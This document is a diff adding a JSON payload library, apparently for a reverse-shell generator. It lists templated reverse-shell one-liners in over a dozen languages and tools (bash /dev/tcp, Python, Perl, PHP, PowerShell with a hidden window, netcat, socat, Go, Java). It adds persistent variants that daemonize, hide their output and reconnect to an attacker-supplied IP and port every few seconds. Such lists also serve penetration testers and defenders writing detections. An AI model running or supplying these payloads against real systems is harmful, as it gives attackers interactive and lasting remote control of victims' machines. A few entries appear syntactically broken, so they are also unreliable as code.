@@ -1,0 +1,194 @@
+{
+  "shells": {
+    "bash": {
+      "name": "Bash",
+      "payload": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+      "description": "Classic bash reverse shell using /dev/tcp",
+      "requirements": "bash with /dev/tcp support"
+    },
+    "sh": {
+      "name": "Shell (sh)",
+      "payload": "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+      "description": "POSIX shell reverse shell",
+      "requirements": "sh with /dev/tcp support"
+    },
+    "python": {
+      "name": "Python",
+      "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "description": "Python socket-based reverse shell",
+      "requirements": "python or python2/python3"
+    },
+    "python3": {
+      "name": "Python3",
+      "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "description": "Python3 specific reverse shell",
+      "requirements": "python3"
+    },
+    "perl": {
+      "name": "Perl",
+      "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "description": "Perl socket reverse shell",
+      "requirements": "perl"
+    },
+    "php": {
+      "name": "PHP",
+      "payload": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "description": "PHP reverse shell using fsockopen",
+      "requirements": "php-cli"
+    },
+    "ruby": {
+      "name": "Ruby",
+      "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "description": "Ruby TCP socket reverse shell",
+      "requirements": "ruby"
+    },
+    "powershell": {
+      "name": "PowerShell",
+      "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+      "description": "PowerShell reverse shell with hidden window",
+      "requirements": "powershell"
+    },
+    "golang": {
+      "name": "Go",
+      "payload": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+      "description": "Go reverse shell (compile and execute)",
+      "requirements": "go compiler"
+    },
+    "nc": {
+      "name": "Netcat",
+      "payload": "nc -e /bin/sh {ip} {port}",
+      "description": "Traditional netcat with -e flag",
+      "requirements": "netcat with -e support"
+    },
+    "nc_openbsd": {
+      "name": "Netcat (OpenBSD)",
+      "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+      "description": "OpenBSD netcat without -e flag",
+      "requirements": "netcat (openbsd version)"
+    },
+    "socat": {
+      "name": "Socat",
+      "payload": "socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
+      "description": "Socat reverse shell with full TTY",
+      "requirements": "socat"
+    },
+    "node": {
+      "name": "Node.js",
+      "payload": "node -e \"var net = require('net'); var spawn = require('child_process').spawn; var client = new net.Socket(); client.connect({port}, '{ip}', function(){{ var sh = spawn('/bin/sh',[]); client.write('Connected\\\\n'); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){{ client.end(); }}); }});\"",
+      "description": "Node.js reverse shell",
+      "requirements": "node"
+    },
+    "java": {
+      "name": "Java",
+      "payload": "java -cp .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar -c 'import java.io.*;import java.net.*;public class RevShell{{public static void main(String[] args) throws Exception{{Socket s = new Socket(\"{ip}\",{port});Process p = new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();InputStream pi = p.getInputStream();InputStream si = s.getInputStream();OutputStream po = p.getOutputStream();OutputStream so = s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0) so.write(pi.read());while(si.available()>0) po.write(si.read());Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}}}}}'",
+      "description": "Java reverse shell",
+      "requirements": "java"
+    }
+  },
+  "persistent_shells": {
+    "bash": {
+      "name": "Bash (Persistent)",
+      "payload": "nohup bash -c 'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1; sleep 10; done' >/dev/null 2>&1 &",
+      "description": "Persistent bash reverse shell with auto-reconnect",
+      "requirements": "bash with /dev/tcp support"
+    },
+    "sh": {
+      "name": "Shell (Persistent)",
+      "payload": "nohup sh -c 'while true; do sh -i >& /dev/tcp/{ip}/{port} 0>&1; sleep 10; done' >/dev/null 2>&1 &",
+      "description": "Persistent POSIX shell with auto-reconnect",
+      "requirements": "sh with /dev/tcp support"
+    },
+    "python": {
+      "name": "Python (Persistent)",
+      "payload": "python -c \"import socket,subprocess,os,time,sys;exec('try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\'/\\');\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\'{ip}\\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/bash\\',\\'-i\\'])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass')\" &",
+      "description": "Persistent Python daemon with auto-reconnect",
+      "requirements": "python"
+    },
+    "python3": {
+      "name": "Python3 (Persistent)",
+      "payload": "python3 -c \"import socket,subprocess,os,time,sys;exec('try:\\n if os.fork()>0:sys.exit(0)\\nexcept:sys.exit(1)\\nos.setsid();os.chdir(\\'/\\');\\nwhile True:\\n try:\\n  s=socket.socket();s.connect((\\'{ip}\\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/bash\\',\\'-i\\'])\\n except:time.sleep(10)\\n finally:\\n  try:s.close()\\n  except:pass')\" &",
+      "description": "Persistent Python3 daemon with auto-reconnect",
+      "requirements": "python3"
+    },
+    "perl": {
+      "name": "Perl (Persistent)",
+      "payload": "perl -e 'use Socket;use POSIX;fork&&exit;setsid;chdir\"/\";while(1){socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in({port},inet_aton(\"{ip}\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh -i\");}close(S);sleep(10);}' &",
+      "description": "Persistent Perl daemon with auto-reconnect",
+      "requirements": "perl"
+    },
+    "php": {
+      "name": "PHP (Persistent)",
+      "payload": "php -r 'pcntl_fork()||exit;posix_setsid();chdir(\"/\");while(1){$s=fsockopen(\"{ip}\",{port});if($s){proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);}fclose($s);sleep(10);}' &",
+      "description": "Persistent PHP daemon with auto-reconnect",
+      "requirements": "php-cli with pcntl extension"
+    },
+    "ruby": {
+      "name": "Ruby (Persistent)",
+      "payload": "ruby -e 'require \"socket\";Process.daemon;while(1);begin;s=TCPSocket.open(\"{ip}\",{port});[0,1,2].each{|fd|syscall(33,s.fileno,fd)};system(\"/bin/sh -i\");rescue;sleep(10);end;end' &",
+      "description": "Persistent Ruby daemon with auto-reconnect",
+      "requirements": "ruby"
+    },
+    "node": {
+      "name": "Node.js (Persistent)",
+      "payload": "node -e \"require('child_process').spawn('node',['-e','const net=require(\\\"net\\\");const{spawn}=require(\\\"child_process\\\");process.daemon=true;setInterval(()=>{try{const client=new net.Socket();client.connect({port},\\\"{ip}\\\",()=>{const sh=spawn(\\\"/bin/sh\\\",[]);client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}catch(e){}}30000);'],{detached:true,stdio:'ignore'}).unref();\" &",
+      "description": "Persistent Node.js daemon with auto-reconnect",
+      "requirements": "node"
+    },
+    "nc": {
+      "name": "Netcat (Persistent)",
+      "payload": "nohup bash -c 'while true; do nc -e /bin/sh {ip} {port}; sleep 10; done' >/dev/null 2>&1 &",
+      "description": "Persistent netcat with auto-reconnect",
+      "requirements": "netcat with -e support"
+    },
+    "nc_openbsd": {
+      "name": "Netcat OpenBSD (Persistent)",
+      "payload": "nohup bash -c 'while true; do rm /tmp/f 2>/dev/null; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f; sleep 10; done' >/dev/null 2>&1 &",
+      "description": "Persistent OpenBSD netcat with auto-reconnect",
+      "requirements": "netcat (openbsd version)"
+    },
+    "socat": {
+      "name": "Socat (Persistent)",
+      "payload": "nohup bash -c 'while true; do socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:{ip}:{port}; sleep 10; done' >/dev/null 2>&1 &",
+      "description": "Persistent socat with full TTY and auto-reconnect",
+      "requirements": "socat"
+    },
+    "golang": {
+      "name": "Go (Persistent)",
+      "payload": "echo 'package main;import(\"os/exec\";\"net\";\"time\";\"os\");func main(){for{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");if c!=nil{cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();c.Close();}time.Sleep(10*time.Second);}}' > /tmp/p.go && nohup go run /tmp/p.go >/dev/null 2>&1 & rm /tmp/p.go",
+      "description": "Persistent Go reverse shell with auto-reconnect",
+      "requirements": "go compiler"
+    },
+    "powershell": {
+      "name": "PowerShell (Persistent)",
+      "payload": "powershell -WindowStyle Hidden -Command \"while($true){{try{{$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}}catch{{Start-Sleep 10}}}}\"",
+      "description": "Persistent PowerShell with auto-reconnect (Windows)",
+      "requirements": "powershell"
+    },
+    "java": {
+      "name": "Java (Persistent)",
+      "payload": "cd /tmp && echo 'import java.io.*;import java.net.*;public class Shell{{public static void main(String[]a)throws Exception{{while(true){{try{{Socket s=new Socket(\"{ip}\",{port});Process p=Runtime.getRuntime().exec(new String[]{{\"/bin/bash\",\"-i\"}});InputStream pi=p.getInputStream();InputStream pe=p.getErrorStream();OutputStream po=p.getOutputStream();InputStream si=s.getInputStream();OutputStream so=s.getOutputStream();new Thread(()->{{try{{byte[]b=new byte[1024];int l;while((l=pi.read(b))!=-1){{so.write(b,0,l);so.flush();}}}}catch(Exception e){{}}}}).start();new Thread(()->{{try{{byte[]b=new byte[1024];int l;while((l=pe.read(b))!=-1){{so.write(b,0,l);so.flush();}}}}catch(Exception e){{}}}}).start();new Thread(()->{{try{{byte[]b=new byte[1024];int l;while((l=si.read(b))!=-1){{po.write(b,0,l);po.flush();}}}}catch(Exception e){{}}}}).start();p.waitFor();}}catch(Exception e){{Thread.sleep(10000);}}}}}}}}' > Shell.java && javac Shell.java && nohup java Shell >/dev/null 2>&1 &",
+      "description": "Persistent Java reverse shell with auto-reconnect and better I/O handling",
+      "requirements": "java and javac"
+    }
+  },
+  "ipv6_shells": {
+    "bash": {
+      "name": "Bash (IPv6)",
+      "payload": "bash -i >& /dev/tcp/[{ip}]/{port} 0>&1",
+      "description": "Bash reverse shell for IPv6",
+      "requirements": "bash with IPv6 /dev/tcp support"
+    },
+    "python": {
+      "name": "Python (IPv6)",
+      "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "description": "Python IPv6 reverse shell",
+      "requirements": "python with IPv6 support"
+    },
+    "nc": {
+      "name": "Netcat (IPv6)",
+      "payload": "nc -6 -e /bin/sh {ip} {port}",
+      "description": "IPv6 netcat reverse shell",
+      "requirements": "netcat with IPv6 support"
+    }
+  }
+}
